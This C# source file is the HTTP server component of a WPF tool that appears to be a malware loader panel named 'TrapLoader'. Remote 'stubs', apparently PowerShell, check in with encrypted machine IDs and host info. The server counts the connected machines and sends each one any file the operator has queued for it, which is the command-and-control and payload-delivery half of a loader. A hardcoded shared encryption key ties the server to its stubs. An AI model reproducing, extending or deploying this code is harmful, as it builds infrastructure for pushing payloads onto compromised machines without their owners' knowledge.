using System;
using System.Collections.Concurrent;
using System.IO;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Net.Sockets;

namespace WpfApp
{
    /// <summary>
    /// HTTP/HTTPS server used by the loader to communicate with stubs.
    /// Each stub POSTs JSON { data: "encrypted_payload" } to /loader and expects binary data back.
    /// The encrypted payload contains { password, info, machine_id, timestamp }.
    /// If a file is queued for that client, the server responds with 200 + payload bytes.
    /// Otherwise, a 204/NoContent status is returned so the stub will poll again later.
    /// </summary>
    public class HttpServer : IDisposable
    {
        private readonly MainWindow _ui;
        private readonly HttpListener _listener = new();
        private readonly string _password;
        private readonly string _encryptionKey = "TrapLoaderSecureKey123"; // Must match the key in the stub
        private readonly ConcurrentDictionary<string, string> _fileQueue = new();
        private bool _isRunning;
        private readonly ConcurrentDictionary<string, ClientInfo> _connectedClients = new();
        // Certificate no longer required – keeping variable for compatibility but unused
        private readonly X509Certificate2? _certificate;
        private readonly ConcurrentDictionary<string, RequestCounter> _requestCounters = new();
        private const int RequestsPerMinuteLimit = 60;
        private class RequestCounter
        {
            public int Count;
            public DateTime WindowStart;
        }

        public HttpServer(MainWindow ui, string prefix, string password, X509Certificate2? certificate = null)
        {
            _ui = ui;
            _password = password ?? throw new ArgumentNullException(nameof(password));
            _certificate = certificate; // optional, not used
            // Allow both HTTP and HTTPS prefixes now
            
            if (!prefix.EndsWith("/")) prefix += "/";
            _listener.Prefixes.Add(prefix);
            
            // Keep strong TLS settings for HTTPS scenarios but don't require them.
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
            
            // Enforce strong encryption
            ServicePointManager.DefaultConnectionLimit = 100;
        }

        public void Start()
        {
            if (_isRunning) return;
            _listener.Start();
            _isRunning = true;
            Task.Run(ListenLoop);
            _ui.AppendLog($"HTTP server started on {string.Join(", ", _listener.Prefixes)}");
        }

        public void Stop()
        {
            if (!_isRunning) return;
            _isRunning = false;
            _listener.Stop();
            _ui.AppendLog("HTTP server stopped.");
        }

        public void EnqueueFileForClient(string clientId, string filePath)
        {
            if (string.IsNullOrWhiteSpace(clientId) || string.IsNullOrWhiteSpace(filePath)) return;
            _fileQueue[clientId] = filePath;
        }

        private async Task ListenLoop()
        {
            while (_isRunning)
            {
                HttpListenerContext ctx;
                try
                {
                    ctx = await _listener.GetContextAsync();
                }
                catch (ObjectDisposedException) { break; }
                catch (HttpListenerException) { break; }
                catch (Exception ex)
                {
                    _ui.AppendLog($"Listener exception: {ex.Message}");
                    continue;
                }

                _ = Task.Run(() => HandleRequestAsync(ctx));
            }
        }

        // Decrypt data from PowerShell stub
        private string DecryptData(string encryptedBase64, string key)
        {
            try
            {
                _ui.AppendLog($"Attempting to decrypt data of length {encryptedBase64?.Length}");
                
                // Convert from Base64
                byte[] cipherBytes = Convert.FromBase64String(encryptedBase64);
                _ui.AppendLog($"Decoded base64 data, length: {cipherBytes.Length} bytes");
                
                // Extract IV (first 16 bytes)
                if (cipherBytes.Length <= 16)
                {
                    _ui.AppendLog("Error: Encrypted data too short to contain IV");
                    return null;
                }
                
                byte[] iv = new byte[16];
                byte[] cipherText = new byte[cipherBytes.Length - 16];
                Buffer.BlockCopy(cipherBytes, 0, iv, 0, 16);
                Buffer.BlockCopy(cipherBytes, 16, cipherText, 0, cipherBytes.Length - 16);
                
                _ui.AppendLog($"Extracted IV (16 bytes) and cipher text ({cipherText.Length} bytes)");
                
                // Create key
                using SHA256 sha256 = SHA256.Create();
                byte[] keyBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                
                // Decrypt
                using Aes aes = Aes.Create();
                aes.Key = keyBytes;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                
                using ICryptoTransform decryptor = aes.CreateDecryptor();
                
                // Use CryptoStream for decryption
                using MemoryStream msDecrypt = new MemoryStream(cipherText);
                using CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read);
                using StreamReader srDecrypt = new StreamReader(csDecrypt);
                
                // Read the decrypted bytes from the decrypting stream
                string plaintext = srDecrypt.ReadToEnd();
                _ui.AppendLog($"Decryption successful, plaintext length: {plaintext.Length}");
                return plaintext;
            }
            catch (Exception ex)
            {
                _ui.AppendLog($"Decryption error: {ex.Message}");
                if (ex.InnerException != null)
                {
                    _ui.AppendLog($"Inner exception: {ex.InnerException.Message}");
                }
                return null;
            }
        }

        private async Task HandleRequestAsync(HttpListenerContext ctx)
        {
            try
            {
                // Set security headers
                ctx.Response.Headers.Add("X-Content-Type-Options", "nosniff");
                ctx.Response.Headers.Add("X-Frame-Options", "DENY");
                ctx.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
                ctx.Response.Headers.Add("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
                ctx.Response.Headers.Add("Pragma", "no-cache");
                
                // Only add HSTS for HTTPS connections
                if (ctx.Request.IsSecureConnection)
                {
                    ctx.Response.Headers.Add("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
                    ctx.Response.Headers.Add("Content-Security-Policy", "default-src 'none'");
                }

                if (ctx.Request.HttpMethod != "POST")
                {
                    ctx.Response.StatusCode = (int)HttpStatusCode.MethodNotAllowed;
                    ctx.Response.Close();
                    return;
                }

                // Validate content length to prevent DoS
                if (ctx.Request.ContentLength64 > 20480) // 20KB max
                {
                    ctx.Response.StatusCode = (int)HttpStatusCode.RequestEntityTooLarge;
                    ctx.Response.Close();
                    return;
                }

                string body;
                using (var reader = new StreamReader(ctx.Request.InputStream, ctx.Request.ContentEncoding))
                {
                    body = await reader.ReadToEndAsync();
                }
                
                _ui.AppendLog($"Received request from {ctx.Request.RemoteEndPoint}");
                _ui.AppendLog($"Request body: {(body.Length > 100 ? body.Substring(0, 100) + "..." : body)}");

                // Validate JSON structure
                string password, clientInfo, machineId;
                try
                {
                    using var doc = JsonDocument.Parse(body);
                    var root = doc.RootElement;
                    
                    // Basic rate-limiting
                    string clientIp = ctx.Request.RemoteEndPoint?.Address.ToString() ?? "unknown";
                    if (!IsRequestAllowed(clientIp))
                    {
                        _ui.AppendLog($"Rate limit exceeded for {clientIp}");
                        ctx.Response.StatusCode = (int)HttpStatusCode.TooManyRequests; // 429
                        ctx.Response.Close();
                        return;
                    }

                    // Require application/json
                    if (!ctx.Request.HasEntityBody || !ctx.Request.ContentType?.StartsWith("application/json", StringComparison.OrdinalIgnoreCase) == true)
                    {
                        ctx.Response.StatusCode = (int)HttpStatusCode.UnsupportedMediaType; // 415
                        ctx.Response.Close();
                        return;
                    }

                    // Handle both encrypted and unencrypted formats
                    if (root.TryGetProperty("data", out var encryptedData))
                    {
                        _ui.AppendLog("Encrypted payload detected, attempting to decrypt...");
                        string encryptedValue = encryptedData.GetString();
                        string decryptedJson = DecryptData(encryptedValue, _encryptionKey);
                        
                        if (string.IsNullOrEmpty(decryptedJson))
                        {
                            _ui.AppendLog("Decryption failed - null or empty result");
                            ctx.Response.StatusCode = (int)HttpStatusCode.BadRequest;
                            ctx.Response.Close();
                            return;
                        }
                        
                        _ui.AppendLog($"Decrypted JSON: {(decryptedJson.Length > 100 ? decryptedJson.Substring(0, 100) + "..." : decryptedJson)}");
                        
                        try {
                            using var decryptedDoc = JsonDocument.Parse(decryptedJson);
                            var decryptedRoot = decryptedDoc.RootElement;
                            
                            password = decryptedRoot.GetProperty("password").GetString();
                            clientInfo = decryptedRoot.GetProperty("info").GetString();
                            machineId = decryptedRoot.TryGetProperty("machine_id", out var mid) ? mid.GetString() : "";
                            
                            _ui.AppendLog($"Successfully parsed decrypted JSON. Password length: {password?.Length}, Info: {clientInfo}");
                        }
                        catch (JsonException ex)
                        {
                            _ui.AppendLog($"Decrypted JSON parsing error: {ex.Message}");
                            ctx.Response.StatusCode = (int)HttpStatusCode.BadRequest;
                            ctx.Response.Close();
                            return;
                        }
                    }
                    else
                    {
                        _ui.AppendLog("Unencrypted payload received.");
                        password = root.GetProperty("password").GetString();
                        clientInfo = root.GetProperty("info").GetString();
                        machineId = root.TryGetProperty("machine_id", out var mid) ? mid.GetString() : "";
                    }
                    
                    // Validate input lengths
                    if (string.IsNullOrEmpty(password) || password.Length > 100 || 
                        string.IsNullOrEmpty(clientInfo) || clientInfo.Length > 1000)
                    {
                        _ui.AppendLog($"Invalid input lengths: Password length: {password?.Length}, Info length: {clientInfo?.Length}");
                        ctx.Response.StatusCode = (int)HttpStatusCode.BadRequest;
                        ctx.Response.Close();
                        return;
                    }
                }
                catch (JsonException ex)
                {
                    _ui.AppendLog($"JSON parsing error: {ex.Message}");
                    ctx.Response.StatusCode = (int)HttpStatusCode.BadRequest; // 400
                    ctx.Response.Close();
                    return;
                }
                catch (Exception ex)
                {
                    _ui.AppendLog($"Request body processing error: {ex.Message}");
                    ctx.Response.StatusCode = (int)HttpStatusCode.InternalServerError; // 500
                    ctx.Response.Close();
                    return;
                }

                if (string.IsNullOrEmpty(machineId))
                {
                    _ui.AppendLog("Client connected without a machine ID.");
                }
                else
                {
                    if (_connectedClients.TryAdd(machineId, new ClientInfo { LastSeen = DateTime.UtcNow }))
                    {
                        _ui.AppendLog($"New client connected: {machineId}");
                        _ui.UpdateClientCount(_connectedClients.Count);
                    }
                    else
                    {
                        // Optionally update last seen time for existing clients
                        _connectedClients[machineId].LastSeen = DateTime.UtcNow;
                    }
                }

                // Constant-time password comparison to prevent timing attacks
                if (!SecureStringCompare(password, _password))
                {
                    _ui.AppendLog("Password verification failed");
                    ctx.Response.StatusCode = (int)HttpStatusCode.Forbidden;
                    ctx.Response.Close();
                    return;
                }

                // Use machine ID if available, otherwise fall back to IP
                string clientId = !string.IsNullOrEmpty(machineId) ? machineId : ctx.Request.RemoteEndPoint.ToString();
                _ui.OnHttpClientInfo(clientId, clientInfo);
                _ui.AppendLog($"Client authenticated: {clientId}");

                if (_fileQueue.TryRemove(clientId, out var filePath) && File.Exists(filePath))
                {
                    byte[] bytes = await File.ReadAllBytesAsync(filePath);
                    ctx.Response.StatusCode = (int)HttpStatusCode.OK;
                    ctx.Response.ContentType = "application/octet-stream";
                    ctx.Response.ContentLength64 = bytes.Length;
                    await ctx.Response.OutputStream.WriteAsync(bytes, 0, bytes.Length);
                    _ui.AppendLog($"Sent file to client: {Path.GetFileName(filePath)} ({bytes.Length} bytes)");
                }
                else
                {
                    ctx.Response.StatusCode = (int)HttpStatusCode.NoContent; // 204
                    _ui.AppendLog("No file queued for client, sent 204 response");
                }
            }
            catch (Exception ex)
            {
                _ui.AppendLog($"Request handling error: {ex.Message}");
                if (ex.InnerException != null)
                {
                    _ui.AppendLog($"Inner exception: {ex.InnerException.Message}");
                }
                try {
                    ctx.Response.StatusCode = (int)HttpStatusCode.InternalServerError;
                } catch {}
            }
            finally
            {
                try { ctx.Response.Close(); } catch { }
            }
        }

        private bool IsRequestAllowed(string ip)
        {
            var now = DateTime.UtcNow;
            var counter = _requestCounters.GetOrAdd(ip, _ => new RequestCounter { Count = 0, WindowStart = now });
            lock (counter)
            {
                // Refresh window every minute
                if (now - counter.WindowStart > TimeSpan.FromMinutes(1))
                {
                    counter.WindowStart = now;
                    counter.Count = 0;
                }

                if (counter.Count >= RequestsPerMinuteLimit)
                {
                    return false;
                }
                counter.Count++;
                return true;
            }
        }

        // Constant-time string comparison to prevent timing attacks
        private static bool SecureStringCompare(string a, string b)
        {
            if (a == null || b == null || a.Length != b.Length)
                return false;

            int result = 0;
            for (int i = 0; i < a.Length; i++)
            {
                // XOR the bytes - if they're the same, XOR will be 0
                result |= a[i] ^ b[i];
            }
            
            return result == 0;
        }

        public int GetConnectedClientsCount()
        {
            return _connectedClients.Count;
        }

        public void Dispose()
        {
            Stop();
            _listener.Close();
        }
    }

    // Represents a connected client
    public class ClientInfo
    {
        public DateTime LastSeen { get; set; }
        // Add other client-specific info here if needed
    }
} 